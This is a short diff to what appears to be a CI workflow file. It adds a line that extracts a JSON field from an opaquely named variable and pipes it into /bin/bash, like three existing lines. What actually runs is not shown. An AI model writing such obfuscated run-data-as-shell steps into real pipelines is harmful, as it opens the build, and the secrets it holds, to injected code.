@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$ckx159" | jq -r .ta1906 | /bin/bash
           echo $ug84 | jq -r .z7 | /bin/bash
           printf '%s' "$ay812" | jq -r .j94996 | /bin/bash
+          echo $xlku0 | jq -r .uj20 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
